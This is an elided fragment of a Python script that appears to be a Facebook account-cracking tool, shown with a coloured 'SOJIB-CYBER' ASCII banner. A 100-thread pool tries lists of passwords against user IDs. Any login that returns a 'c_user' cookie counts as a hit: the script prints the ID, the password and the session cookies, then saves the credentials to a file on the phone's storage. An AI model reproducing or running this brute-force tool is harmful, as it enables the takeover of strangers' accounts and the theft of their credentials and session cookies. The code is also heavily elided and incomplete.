...
logo="""
\033[38;5;46m.d8888. .88b  d88.                        
\033[38;5;46m88'  YP 88'YbdP`88                        
\033[38;5;46m`8bo.   88  88  88                        
\033[38;5;46m  `Y8b. 88  88  88                        
\033[38;5;46mdb   8D 88  88  88                        
\033[38;5;46m`8888Y' YP  YP  YP                        
                                          
                                          
\x1b[38;5;196m.d8888.  .d88b.     d88b d888888b d8888b. 
\x1b[38;5;196m88'  YP .8P  Y8.    `8P'   `88'   88  `8D 
\x1b[38;5;196m`8bo.   88    88     88     88    88oooY' 
\x1b[38;5;196m  `Y8b. 88    88     88     88    88~~~b. 
\x1b[38;5;196mdb   8D `8b  d8' db. 88    .88.   88   8D 
\x1b[38;5;196m`8888Y'  `Y88P'  Y8888P  Y888888P Y8888P'"""
...
def sykology():
    ...
    with ThreadPool(max_workers=100) as feel:
        ...
        print(logo)
        tl=str(len(SOJIB))
        print(f"    \033[38;5;46mID SAVE: /\033[38;5;47msdcard/\033[38;5;49mSOJIB-ok.txt") 
...
def random_subb(uid,pwx,fb,fb1):
    ...
    sys.stdout.write(f"\r\033[38;5;46m[SOJIB-CYBER] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            if "c_user" in eehhcc:
                ...
                xd="1000"+coki1[0:11]
                print(f"\r\r\033[38;5;46m[SOJIB-OK] \033[38;5;47m{xd} | {ps}  \n\033[38;5;46m[COOKIES] \033[38;5;49msb={sort}\n\033[38;5;48m———————————————————————————————————— ")
                open("/sdcard/SOJIB-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
